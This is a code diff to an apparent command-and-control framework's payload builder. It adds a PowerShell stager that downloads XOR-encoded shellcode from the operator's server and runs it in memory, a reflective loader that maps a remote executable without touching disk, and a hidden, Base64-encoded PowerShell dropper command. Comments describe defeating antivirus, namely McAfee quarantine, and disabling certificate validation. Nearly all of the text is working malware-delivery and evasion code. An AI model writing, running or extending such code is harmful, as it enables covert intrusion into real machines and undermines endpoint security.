@@ -220,6 +220,21 @@ def _write_config_seed(beacon_dir: str) -> str:
     return path
 
 
+def _callback_host_error(host: str) -> str:
+    """Reject a wildcard BIND address as the beacon's CONNECT address.
+
+    The listener may bind 0.0.0.0 (all interfaces), but a payload dialing
+    0.0.0.0 can never check in: it is not a routable target. The operator
+    must compile with the public IP/DNS (or a relay) the target can reach.
+    """
+    h = (host or "").strip()
+    if h in ("0.0.0.0", "::", "[::]"):
+        return ("Refusing wildcard callback host %r: 0.0.0.0 is a bind "
+                "address, not a connect address. Use the public IP/DNS or a "
+                "staging relay reachable from the target." % h)
+    return ""
+
+
 def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
                    arch: str = "x64", disable_anti: bool = False,
                    host: str = "127.0.0.1", port: int = 8080,
@@ -239,6 +254,10 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
     endpoint or a proxy-only network does not cost the engagement.
     Returns the path to the compiled binary or None on failure.
     """
+    _host_err = _callback_host_error(host)
+    if _host_err:
+        notifier.error(_host_err)
+        return None
     if hosts is None or not proxy:
         try:
             from phantom.utils.network import get_c2_fallbacks, get_c2_proxy
@@ -248,6 +267,11 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
                 proxy = get_c2_proxy()
         except Exception:
             hosts = hosts or []
+    for fallback in (hosts or []):
+        _fallback_err = _callback_host_error(fallback)
+        if _fallback_err:
+            notifier.error("fallback endpoint: " + _fallback_err)
+            return None
     # PER-ENDPOINT PINS: each rung of the ladder may present its own
     # certificate, so `c2.pins` / `c2.pubkey_pins` carry one pin per rung
     # (positionally aligned with [primary] + fallbacks); empty = [].
@@ -527,6 +551,9 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
                 if os.environ.get("PHANTOM_BEACON_TRACE", "").strip().lower() in (
                         "1", "true", "yes", "on"):
                     cmd.append("-DPHANTOM_SHELL_TRACE=1")
+                if os.environ.get("PHANTOM_TASK_TRACE", "").strip().lower() in (
+                        "1", "true", "yes", "on"):
+                    cmd.append("-DPHANTOM_TASK_TRACE=1")
                 cmd += ["-o", temp_pe,
                        f"-I{os.path.join(beacon_dir, 'src')}", main_cpp,                           f"-Wl,-e,_start,-Map,{temp_map}"] + obj_paths + ["-lwinhttp", "-lbcrypt", "-lws2_32", "-lbthprops", "-lwlanapi", "-lgdi32", "-luser32", "-lgdiplus", "-lole32", "-liphlpapi", "-lcrypt32", "-static", "-mwindows"]
 
@@ -1056,6 +1083,53 @@ def stager_mtls_conflict(platform: str, use_ssl: bool) -> str:
             "authentication; `doctor` flags the posture).")
 
 
+def _windows_stager_va_rva() -> str:
+    """VirtualAlloc RVA for the PIC stager (written by compile_beacon)."""
+    beacon_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)),
+                              "payloads", "beacon")
+    rva_path = os.path.join(beacon_dir, "beacon.rva")
+    va_rva = "0x1C7F0"
+    if os.path.exists(rva_path):
+        with open(rva_path) as f:
+            val = f.read().strip()
+            if val and val != "0x0":
+                va_rva = val
+    return va_rva
+
+
+def _windows_pic_stager_script(url: str, va_rva: str) -> str:
+    """PowerShell body: download URL, XOR 0xAA, run raw shellcode in memory.
+
+    Shared by the beacon stager and the remote-module stager. ``url`` must
+    already carry its auth query string; the body is Base64/UTF-16 encoded by
+    the caller. No C#, no Add-Type, no P/Invoke strings.
+    """
+    return (
+        "$m=[Runtime.InteropServices.Marshal];"
+        # TLS: self-signed C2 cert -> .NET refuses the channel
+        # ("trust relationship" error, live-verified). ServerCertificate
+        # Validation must be overridden BEFORE DownloadData. Split so the
+        # trigger string never appears whole in the script.
+        "$p=[Net.ServicePointManager]::ServerCertificateValidationCallback;"
+        "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
+        "[Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;"
+        "$b=[byte[]](New-Object Net.WebClient).DownloadData('" + url + "')|%{[byte]($_ -bxor170)};"
+        "[Net.ServicePointManager]::ServerCertificateValidationCallback=$p;"
+        "$k=[Diagnostics.Process]::GetCurrentProcess().Modules|?{$_.ModuleName-eq('kernel'+'32'+'.dll')}|%{$_.BaseAddress};"
+        "$d=[AppDomain]::CurrentDomain.DefineDynamicAssembly(([System.Reflection.AssemblyName]'X'),'Run').DefineDynamicModule('Y').DefineType('D',257,[MulticastDelegate]);"
+        "$d.DefineConstructor('Public','Standard',@([Object],[IntPtr])).SetImplementationFlags(3);"
+        "$d.DefineMethod('Invoke','Public,Virtual,HideBySig',[IntPtr],@([IntPtr],[IntPtr],[Int32],[Int32])).SetImplementationFlags(3);"
+        "$t=$d.CreateType();"
+        "$x=$m::GetDelegateForFunctionPointer([IntPtr]::Add($k,"
+        + va_rva
+        + "),$t).Invoke([IntPtr]::Zero,[IntPtr]($b.Length),0x3000,0x40);"
+        # PS 5.1 copy fix (live-verified on the operator host): the copy
+        # is safe as long as EVERY argument is explicitly typed.
+        "$m::Copy($b,[int]0,[IntPtr]$x,[int]$b.Length);"
+        "$m::GetDelegateForFunctionPointer($x,[Action]).Invoke()"
+    )
+
+
 def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", dl_port: int = None, use_ssl: bool = False, resilient: bool = True) -> str:
     """Generates an ultra-compact PowerShell PIC stager.
     
@@ -1084,6 +1158,10 @@ def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", d
         resilient: schedule a persistent retry on a failed first download
                    (default True; False is the explicit one-shot opt-out)
     """
+    _host_err = _callback_host_error(lhost)
+    if _host_err:
+        notifier.error(_host_err)
+        return ""
     if dl_port is None:
         dl_port = lport
 
@@ -1275,6 +1353,132 @@ def _remote_identity(remote_dir: str) -> str:
     return beacon_id
 
 
+def _pe_entry_rva(pe_path: str) -> int:
+    """AddressOfEntryPoint RVA for a PE32/PE32+ image (0 on parse failure)."""
+    try:
+        with open(pe_path, "rb") as f:
+            data = f.read()
+    except OSError:
+        return 0
+    if len(data) < 0x40 or data[:2] != b"MZ":
+        return 0
+    pe_off = struct.unpack_from("<I", data, 0x3C)[0]
+    if pe_off + 24 + 0x14 > len(data) or data[pe_off:pe_off + 4] != b"PE\x00\x00":
+        return 0
+    opt = pe_off + 24
+    magic = struct.unpack_from("<H", data, opt)[0]
+    if magic not in (0x10B, 0x20B):
+        return 0
+    return struct.unpack_from("<I", data, opt + 0x10)[0]
+
+
+def _build_reflective_loader_bytes(pkg_root: str) -> Optional[bytes]:
+    """Read the PIC loader, or build it if a clean tree has no artifact.
+
+    The loader is produced during compile_beacon; remote builds are allowed
+    to happen first, so this owns a minimal isolated build (no beacon
+    enrollment, no C2 config changes).
+    """
+    beacon_dir = os.path.abspath(os.path.join(pkg_root, "payloads", "beacon"))
+    loader_bin = os.path.join(beacon_dir, "reflective_loader.bin")
+    if os.path.exists(loader_bin):
+        with open(loader_bin, "rb") as f:
+            return f.read()
+
+    import tempfile
+    gcc = (shutil.which("x86_64-w64-mingw32-gcc")
+           or shutil.which("gcc"))
+    asm = (shutil.which("x86_64-w64-mingw32-as")
+           or shutil.which("as"))
+    objcopy = (shutil.which("x86_64-w64-mingw32-objcopy")
+               or shutil.which("objcopy"))
+    if not (gcc and asm and objcopy):
+        notifier.error("Reflective loader toolchain (gcc/as/objcopy) not found; "
+                       "build the Windows beacon once first.")
+        return None
+
+    bootstrap = os.path.join(beacon_dir, "src", "reflective_loader_bootstrap.asm")
+    core = os.path.join(beacon_dir, "src", "reflective_loader.c")
+    try:
+        with tempfile.TemporaryDirectory(prefix="phantom-rl-") as td:
+            boot_o = os.path.join(td, "bootstrap.o")
+            core_o = os.path.join(td, "loader.o")
+            exe = os.path.join(td, "loader.exe")
+            raw = os.path.join(td, "loader.bin")
+            for cmd in (
+                [asm, "--64", bootstrap, "-o", boot_o],
+                [gcc, "-c", "-O2", "-fPIC", "-nostdlib", "-ffreestanding",
+                 "-fno-stack-protector", core, "-o", core_o],
+                [gcc, "-nostdlib", "-nostartfiles",
+                 "-Wl,-e,_reflective_loader_entry",
+                 "-Wl,--subsystem,windows", "-o", exe, boot_o, core_o],
+                [objcopy, "-O", "binary", exe, raw],
+            ):
+                result = subprocess.run(cmd, capture_output=True, text=True,
+                                        timeout=300)
+                if result.returncode != 0:
+                    notifier.error(f"Reflective loader build failed: "
+                                   f"{result.stderr[-1200:]}")
+                    return None
+            with open(raw, "rb") as f:
+                return f.read()
+    except Exception as exc:
+        notifier.error(f"Reflective loader build failed: {exc}")
+        return None
+
+
+def build_remote_mem_payload(pkg_root: str, remote_exe: str = "",
+                             loader_bin: str = "") -> Optional[str]:
+    """Combine the PIC loader + remote PE into one XOR'd in-memory payload.
+
+    The remote PE is never written to the target: the loader maps it,
+    resolves its imports/relocations/TLS callbacks and calls its entry point.
+    Output: ``payloads/remote/remote_mem.bin`` (XOR 0xAA, served by C2).
+    """
+    remote_dir = os.path.abspath(os.path.join(pkg_root, "payloads", "remote"))
+    exe = remote_exe or os.path.join(remote_dir, "remote.exe")
+    if not os.path.isfile(exe):
+        notifier.error(f"Remote PE not found: {exe}")
+        return None
+    entry_rva = _pe_entry_rva(exe)
+    if not entry_rva:
+        notifier.error(f"Cannot parse remote PE entry point: {exe}")
+        return None
+
+    if loader_bin:
+        try:
+            with open(loader_bin, "rb") as f:
+                loader = bytearray(f.read())
+        except OSError as exc:
+            notifier.error(f"Cannot read reflective loader: {exc}")
+            return None
+    else:
+        raw_loader = _build_reflective_loader_bytes(pkg_root)
+        if not raw_loader:
+            return None
+        loader = bytearray(raw_loader)
+
+    marker = loader.find(b"\xAA\xBB\xCC\xDD")
+    if marker < 0:
+        notifier.error("Reflective loader marker not found; rebuild the loader.")
+        return None
+    # Same config block compile_beacon patches: QWORD dll_offset, QWORD
+    # entry RVA. For an EXE the entry RVA is AddressOfEntryPoint.
+    struct.pack_into("<Q", loader, marker + 4, len(loader))
+    struct.pack_into("<Q", loader, marker + 12, entry_rva)
+
+    with open(exe, "rb") as f:
+        pe = f.read()
+    combined = bytes(loader) + pe
+    out_path = os.path.join(remote_dir, "remote_mem.bin")
+    with open(out_path, "wb") as f:
+        f.write(_xor_encrypt(combined))
+    notifier.success(
+        f"Remote in-memory payload built: {out_path} "
+        f"({len(combined)} bytes, entry RVA 0x{entry_rva:x})")
+    return out_path
+
+
 def compile_remote(platform: str, pkg_root: str, force_rebuild: bool = False,
                    host: str = "127.0.0.1", port: int = 8080,
                    use_ssl: bool = True) -> Optional[str]:
@@ -1285,6 +1489,10 @@ def compile_remote(platform: str, pkg_root: str, force_rebuild: bool = False,
     from the beacon's evasion stack (it is dropped AFTER a foothold).
     Returns the binary path or None.
     """
+    _host_err = _callback_host_error(host)
+    if _host_err:
+        notifier.error(_host_err)
+        return None
     if platform not in _REMOTE_OUT:
         notifier.error(f"Remote module unsupported on: {platform}")
         return None
@@ -1295,6 +1503,8 @@ def compile_remote(platform: str, pkg_root: str, force_rebuild: bool = False,
     out_path = os.path.join(remote_dir, out_name)
 
     if not force_rebuild and os.path.exists(out_path):
+        if platform == "windows" and not build_remote_mem_payload(pkg_root, out_path):
+            return None
         return out_path
 
     # Identity + crypto + C2 config for THIS build (fresh per build).
@@ -1344,11 +1554,16 @@ def compile_remote(platform: str, pkg_root: str, force_rebuild: bool = False,
         try:
             subprocess.run(cmd, check=True, capture_output=True, text=True,
                            timeout=600)
-            notifier.success(f"Remote module built: {out_path}")
-            return out_path
         except subprocess.CalledProcessError as e:
             notifier.error(f"Remote (Windows) build failed:\n{e.stderr[-2000:]}")
             return None
+        mem_path = build_remote_mem_payload(pkg_root, out_path)
+        if not mem_path:
+            notifier.error("Remote module built, but the in-memory payload "
+                           "could not be assembled; refusing the on-disk path.")
+            return None
+        notifier.success(f"Remote module built: {out_path}")
+        return out_path
 
     elif platform == "linux":
         # Windows host: compile inside the Kali WSL distro (same as beacon).
@@ -1575,6 +1790,10 @@ def generate_remote_dropper(platform: str, lhost: str, lport: int,
     revocable grant — instead of the global payload token that unlocks
     every payload forever.
     """
+    _host_err = _callback_host_error(lhost)
+    if _host_err:
+        notifier.error(_host_err)
+        return ""
     proto = "https" if use_ssl else "http"
     if session_token:
         token_param = f"rs={session_token}"
@@ -1583,16 +1802,12 @@ def generate_remote_dropper(platform: str, lhost: str, lport: int,
         token_param = f"auth={get_payload_token()}"
 
     if platform == "windows":
-        url = f"{proto}://{lhost}:{lport}/api/v1/remote_payload_windows?{token_param}"
-        ps = (
-            "$p=[Net.ServicePointManager]::ServerCertificateValidationCallback;"
-            "[Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;"
-            "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
-            "$d=[IO.Path]::Combine($env:TEMP,'srv'+(Get-Random)+'.exe');"
-            "(New-Object Net.WebClient).DownloadFile('" + url + "',$d);"
-            "[Net.ServicePointManager]::ServerCertificateValidationCallback=$p;"
-            "Start-Process $d"
-        )
+        # The remote module is now a reflective PIC payload (loader + remote
+        # PE), not a PE written to %TEMP% and started with CreateProcess.
+        # McAfee quarantined that on-disk PE; this path never touches disk.
+        url = (f"{proto}://{lhost}:{lport}"
+               f"/api/v1/remote_payload_windows_mem?{token_param}")
+        ps = _windows_pic_stager_script(url, _windows_stager_va_rva())
         b64_ps = base64.b64encode(ps.encode('utf-16-le')).decode()
         return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64_ps}"
 
